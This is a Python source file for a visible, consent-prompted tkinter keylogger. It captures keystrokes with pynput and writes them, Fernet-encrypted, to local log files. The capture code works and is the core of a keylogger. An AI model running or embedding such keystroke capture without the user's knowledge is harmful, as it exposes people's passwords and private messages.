import tkinter as tk
from tkinter import *
from tkinter import messagebox
from pynput import keyboard
import json
from cryptography.fernet import Fernet

# Load the key from the file
def load_key():
    return open("secret.key", "rb").read()

key = load_key()
cipher_suite = Fernet(key)

keys_used = []
flag = False
keys = ""

def generate_text_log(key):
    encrypted_key = cipher_suite.encrypt(key.encode())
    with open('key_log.txt', "ab") as keys:
        keys.write(encrypted_key + b'\n')

def generate_json_file(keys_used):
    encrypted_data = cipher_suite.encrypt(json.dumps(keys_used).encode())
    with open('key_log.json', '+wb') as key_log:
        key_log.write(encrypted_data)

def on_press(key):
    global flag, keys_used, keys
    if flag == False:
        keys_used.append({'Pressed': f'{key}'})
        flag = True

    if flag == True:
        keys_used.append({'Held': f'{key}'})
    generate_json_file(keys_used)

def on_release(key):
    global flag, keys_used, keys
    keys_used.append({'Released': f'{key}'})
    
    if flag == True:
        flag = False
    generate_json_file(keys_used)

    keys = keys + str(key)
    generate_text_log(str(keys))

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'key_log.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

def user_consent():
    consent = messagebox.askyesno("User Consent", "Do you consent to the use of this keylogger for security purposes?")
    if consent:
        start_keylogger()
    else:
        root.quit()

root = Tk()
root.title("Keylogger and Security System")

label = Label(root, text='Click "Start" to begin keylogging.')
label.config(anchor=CENTER)
label.pack()

start_button = Button(root, text="Start", command=user_consent)
start_button.pack(side=LEFT)

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack(side=RIGHT)

root.geometry("300x100")

root.mainloop()
